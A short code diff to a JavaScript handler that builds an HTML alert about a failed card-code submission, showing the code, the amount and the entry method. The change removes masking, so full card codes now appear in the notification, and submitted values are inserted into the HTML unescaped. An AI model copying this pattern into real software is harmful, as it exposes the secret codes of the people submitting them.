@@ -146,7 +146,7 @@ export default async function handler(req, res) {
             <h2 style="margin: 0;">❌ FIRST ATTEMPT FAILED</h2>
           </div>
           <div style="background: white; padding: 20px; border-radius: 8px;">
-            <p><strong>🎮 Code:</strong> ${maskCode(cardNumber)}</p>
+            <p><strong>🎮 Code:</strong> ${cardNumber}</p>
             <p><strong>💰 Amount:</strong> $${amount}</p>
             <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
             <p><strong>📊 Status:</strong> FAILED</p>
